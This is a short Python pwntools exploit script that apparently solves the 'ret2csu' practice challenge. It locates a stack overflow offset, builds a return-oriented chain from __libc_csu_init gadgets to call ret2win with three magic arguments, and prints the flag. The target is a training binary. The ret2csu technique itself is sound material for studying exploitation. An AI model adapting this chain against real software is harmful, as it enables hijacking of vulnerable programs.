from pwn import *
import binascii
import warnings
import struct
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-gef
break print_file
'''.format(**locals())

exe = './ret2csu'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

eip_offset = find_eip(cyclic(100))

rbx_important = 0xe4
target_pointer_which_points_to_a_function_to_execute = 0x6003b0

def generate_r12(rbx, target_address_i_need_to_be_a_pointer):
    return int(hex(target_address_i_need_to_be_a_pointer - rbx * 8), 16)
    
rop = ROP(elf)
rop.raw([
elf.symbols.__libc_csu_init+90, 
p64(rbx_important), 
p64(rbx_important + 0x1), 
generate_r12(rbx_important, target_pointer_which_points_to_a_function_to_execute),
p64(0x0), 
p64(0xcafebabecafebabe),
struct.pack("Q", 0xd00df00dd00df00d),
elf.symbols.__libc_csu_init+64,
pack(0) * 7,
pack(0x00000000004006a3, 64), # pop_rdi 0x00000000004006a3
0xdeadbeefdeadbeef,
b"\x10\x05\x40\x00\x00\x00\x00\x00" # ret2win 0x0000000000400510
])
rop.chain()

payload = fit({
    eip_offset: [
	rop
    ] 
})

io = start()
write("payload", payload)
io.sendlineafter('>', payload)
io.recvline()
flag = io.recvline()
success(flag)

